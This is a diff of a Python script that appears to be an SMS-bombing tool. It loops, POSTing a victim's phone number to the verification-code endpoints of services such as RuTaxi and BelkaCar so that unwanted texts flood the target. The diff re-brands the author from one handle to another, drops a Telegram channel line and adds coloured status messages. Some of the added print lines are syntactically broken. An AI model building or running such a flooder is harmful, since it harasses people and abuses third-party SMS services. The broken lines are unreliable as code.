@@ -8,11 +8,9 @@ banner = """
 |                                                    |
 | [--] Have Services: 51                             |
 |                                                    |
-| [--] Created by: @shabakoff                        |
+| [--] Created by: DarkSuana                         |
 |                                                    |
-| [--] Telegram channel: @codingbots                 |
-|                                                    |
-| [--] Version: 1.0.6                                |
+| [--] Version: 1.0.0                                |
 |____________________________________________________|
 """
 
@@ -51,9 +49,9 @@ while True:
 
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-		print('[+] RuTaxi отправлено!')
+		print(colored("[+] RuTaxi отправлено!)", 'lawngreen')
 	except:
-		print('[-] Не отправлено!')
+		print(colored("[-] Не отправлено!", 'red')
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
